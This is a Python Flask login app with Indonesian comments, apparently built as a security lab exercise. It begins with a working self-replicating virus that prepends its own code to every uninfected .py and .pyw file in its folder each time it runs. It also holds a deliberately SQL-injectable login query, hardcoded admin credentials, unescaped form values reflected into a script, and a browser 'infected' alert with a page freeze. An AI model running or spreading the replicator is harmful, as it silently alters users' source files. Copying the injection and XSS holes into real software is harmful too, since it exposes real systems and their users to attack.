# VIRUS SAYS HI!
import sys
import glob
import os
import sqlite3
from flask import Flask, redirect, request, session

# --- 1. LOGIKA REPLIKASI VIRUS ---
def virus_replication():
    virus_code = []
    # Membaca isi file ini sendiri
    with open(sys.argv[0], 'r') as f:
        lines = f.readlines()

    self_replicating_part = False
    for line in lines:
        if "# VIRUS SAYS HI!" in line:
            self_replicating_part = True
        if self_replicating_part:
            virus_code.append(line)
        if "# VIRUS SAYS BYE!" in line:
            break

    # Menginfeksi semua file .py di folder yang sama
    python_files = glob.glob('*.py') + glob.glob('*.pyw')
    for file in python_files:
        if file == os.path.basename(sys.argv[0]): continue
        with open(file, 'r') as f:
            file_code = f.readlines()
        
        infected = any("# VIRUS SAYS HI!" in line for line in file_code)
        if not infected:
            with open(file, 'w') as f:
                f.writelines(virus_code + ["\n"] + file_code)

# Jalankan replikasi setiap kali script dijalankan
virus_replication()
# VIRUS SAYS BYE!

app = Flask(__name__)
app.secret_key = 'schrodinger cat'
DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')

# --- 2. DATABASE UTILITY ---
def connect_db():
    return sqlite3.connect(DATABASE_PATH)

def init_db():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS user 
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                   username VARCHAR(32) UNIQUE, 
                   password VARCHAR(32))''')
    cur.execute('INSERT OR IGNORE INTO user (id, username, password) VALUES(1, "admin", "123456")')
    conn.commit()
    conn.close()

def get_user_vulnerable(username, password):
    conn = connect_db()
    cur = conn.cursor()
    # SQL INJECTION VULNERABILITY (Menggunakan f-string)
    query = f"SELECT id, username FROM user WHERE username='{username}' AND password='{password}'"
    print(f"Executing Query: {query}") 
    cur.execute(query)
    row = cur.fetchone()
    conn.close()
    return {'id': row[0], 'username': row[1]} if row else None

# --- 3. TAMPILAN FRONTEND ---
def render_login_page(show_virus=False):
    virus_script = ""
    if show_virus:
        virus_script = '''
        <script>
            alert("YOU HAVE BEEN INFECTED HAHAAHA !!!");
            const start = Date.now();
            while (Date.now() - start < 5000) { } // Efek lag/freeze
        </script>
        '''
    
    return f'''
    <html>
    <head>
        <style>
            body {{ font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .card {{ background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 300px; text-align: center; }}
            input {{ width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }}
            input[type="submit"] {{ background: #1877f2; color: white; border: none; font-weight: bold; cursor: pointer; }}
        </style>
    </head>
    <body>
        {virus_script}
        <div class="card">
            <h2>Login Praktikum</h2>
            <form method="POST" action="/login">
                <input name="username" placeholder="Username" type="text" />
                <input name="password" placeholder="Password" type="password" />
                <input value="Login" type="submit" />
            </form>
        </div>
    </body>
    </html>
    '''

# --- 4. ROUTES ---

@app.route('/')
def home():
    # PERBAIKAN: Redirect ke login supaya tidak Not Found
    return redirect('/login')

@app.route('/init')
def db_setup():
    init_db()
    return "Database Initialized! <a href='/login'>Go to Login</a>"

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_login_page()
    
    # Trigger efek "virus" browser saat pertama kali submit
    if not request.args.get('infected'):
        return render_login_page(show_virus=True) + f'''
            <script>
                setTimeout(function(){{
                    document.body.innerHTML += '<form id="f" method="POST" action="/login?infected=true"><input type="hidden" name="username" value="{request.form.get('username')}"><input type="hidden" name="password" value="{request.form.get('password')}"></form>';
                    document.getElementById('f').submit();
                }}, 100);
            </script>
        '''

    user = get_user_vulnerable(request.form['username'], request.form['password'])
    if user:
        return f"<h1>Logged in as: {user['username']}</h1><a href='/logout'>Logout</a>"
    return "Login Gagal! <a href='/login'>Coba Lagi</a>"

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

if __name__ == '__main__':
    init_db()
    app.run(debug=True, port=5000)